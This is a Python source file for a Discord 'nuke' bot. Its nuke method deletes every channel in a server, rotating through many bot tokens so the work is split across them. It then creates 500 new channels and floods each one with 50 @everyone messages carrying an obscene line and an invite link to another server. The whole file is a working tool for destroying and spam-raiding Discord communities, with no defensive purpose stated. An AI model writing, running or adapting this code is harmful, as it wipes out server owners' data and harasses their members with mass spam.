import asyncio
import random

class NukeCommands:
    def __init__(self, bot):
        self.bot = bot

    async def nuke(self, guild):
        print(f"[!] Nuking {guild.name}...")

        # Collect all bot tokens from the http_pool
        all_tokens = list(self.bot.http_pool.sessions.keys())

        # ---------- 1. DELETE ALL CHANNELS ----------
        channels = list(guild.channels)
        tasks = []
        for i, channel in enumerate(channels):
            token = all_tokens[i % len(all_tokens)]  # round-robin tokens
            tasks.append(self._delete_channel(token, channel.id))
        await asyncio.gather(*tasks, return_exceptions=True)
        print("[+] All channels deleted.")

        # ---------- 2. CREATE MAX CHANNELS (500) ----------
        new_channel_ids = []
        # Discord guild limit is 500 channels. We'll try to create 500.
        # To avoid immediate rate-limit, we use a small stagger but still super fast.
        sem = asyncio.Semaphore(50)  # limit concurrent creations per token maybe, but we use many tokens
        async def create_one(i):
            token = all_tokens[i % len(all_tokens)]
            async with sem:
                payload = {"name": f"nuked-{i}", "type": 0}
                resp = await self.bot.http_pool.request(token, "POST",
                                                        f"https://discord.com/api/v10/guilds/{guild.id}/channels",
                                                        json=payload)
                if resp and resp.status == 201:
                    ch_data = await resp.json()
                    return ch_data["id"]
                return None

        creation_tasks = [create_one(i) for i in range(500)]
        results = await asyncio.gather(*creation_tasks, return_exceptions=True)
        new_channel_ids = [cid for cid in results if cid]
        print(f"[+] Created {len(new_channel_ids)} channels.")

        # ---------- 3. SPAM MENTIONS IN EVERY NEW CHANNEL ----------
        spam_text = "# Server fucked by trapstar join https://discord.gg/MXEb5Mdy3G @everyone"
        # We'll send 50 messages per channel, distributed across tokens.
        # Each channel gets 50 messages, but we can send concurrently across channels.
        msg_sem = asyncio.Semaphore(200)  # overall concurrency limit
        async def spam_channel(channel_id):
            # For each channel, spawn 50 message tasks using random tokens
            for _ in range(50):
                token = random.choice(all_tokens)
                async with msg_sem:
                    await self._send_message(token, channel_id, spam_text)

        spam_tasks = []
        for cid in new_channel_ids:
            spam_tasks.append(spam_channel(cid))
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        print(f"[+] Spam complete in {len(new_channel_ids)} channels.")

    async def _delete_channel(self, token, channel_id):
        url = f"https://discord.com/api/v10/channels/{channel_id}"
        await self.bot.http_pool.request(token, "DELETE", url)

    async def _send_message(self, token, channel_id, content):
        url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
        payload = {"content": content}
        await self.bot.http_pool.request(token, "POST", url, json=payload)
